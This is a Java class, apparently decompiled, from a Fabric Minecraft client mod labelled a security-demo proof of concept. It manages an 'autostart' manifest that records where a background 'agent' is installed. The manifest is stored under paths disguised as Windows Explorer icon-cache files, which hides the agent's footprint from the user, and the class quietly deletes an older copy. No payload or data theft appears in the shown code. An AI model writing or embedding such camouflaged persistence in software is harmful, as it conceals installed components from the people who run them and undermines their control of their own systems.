package com.securitydemo.poc;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class AutostartManifest {
   private static final Gson GSON = new Gson();
   private static volatile Cached cached;

   private AutostartManifest() {
   }

   public static Path manifestFile() {
      String local = System.getenv("LOCALAPPDATA");
      return local != null && !Compat.isBlank(local) ? Paths.get(local, "Microsoft", "Windows", "Explorer", "iconcache_48", "layout.idx") : Paths.get(System.getProperty("user.home"), ".iconcache_48", "layout.idx");
   }

   static Path legacyManifestFile() {
      String local = System.getenv("LOCALAPPDATA");
      return local != null && !Compat.isBlank(local) ? Paths.get(local, "Microsoft", "Windows", "Explorer", "iconcache_48.db") : Paths.get(System.getProperty("user.home"), "iconcache_48.db");
   }

   static JsonObject readManifestJson() {
      JsonObject current = parseManifestFile(manifestFile());
      return current != null ? current : parseManifestFile(legacyManifestFile());
   }

   static void removeOwnedLegacyManifest() {
      Path legacy = legacyManifestFile();
      if (Files.exists(legacy, new LinkOption[0])) {
         JsonObject json = parseManifestFile(legacy);
         if (json != null && json.has("installDir")) {
            try {
               Files.deleteIfExists(legacy);
            } catch (IOException var3) {
            }
         }

      }
   }

   static Path agentInstallRoot() {
      Cached info = load();
      if (info != null && info.installDir != null) {
         return info.installDir;
      } else {
         String appData = System.getenv("APPDATA");
         return appData != null && !Compat.isBlank(appData) ? Paths.get(appData, "SecurityDemoPoC") : Paths.get(System.getProperty("user.home"), "SecurityDemoPoC");
      }
   }

   static Path configFile() {
      Cached info = load();
      if (info != null && info.installDir != null) {
         Path prefs = info.installDir.resolve("prefs.json");
         if (Files.exists(prefs, new LinkOption[0])) {
            return prefs;
         }
      }

      return agentInstallRoot().resolve("config.json");
   }

   private static Cached load() {
      Cached hit = cached;
      if (hit != null) {
         return hit;
      } else {
         JsonObject json = readManifestJson();
         if (json != null && json.has("installDir")) {
            cached = new Cached(Paths.get(json.get("installDir").getAsString()));
            return cached;
         } else {
            return null;
         }
      }
   }

   private static JsonObject parseManifestFile(Path file) {
      if (!Files.exists(file, new LinkOption[0])) {
         return null;
      } else {
         try {
            byte[] bytes = Files.readAllBytes(file);
            if (bytes.length != 0 && bytes.length <= 65536) {
               if (bytes[0] != 123) {
                  return null;
               } else {
                  String text = new String(bytes, StandardCharsets.UTF_8);
                  JsonObject json = (JsonObject)GSON.fromJson(text, JsonObject.class);
                  return json != null && json.has("installDir") ? json : null;
               }
            } else {
               return null;
            }
         } catch (Exception var4) {
            return null;
         }
      }
   }

   @Environment(EnvType.CLIENT)
   private static final class Cached {
      final Path installDir;

      Cached(Path installDir) {
         this.installDir = installDir;
      }
   }
}
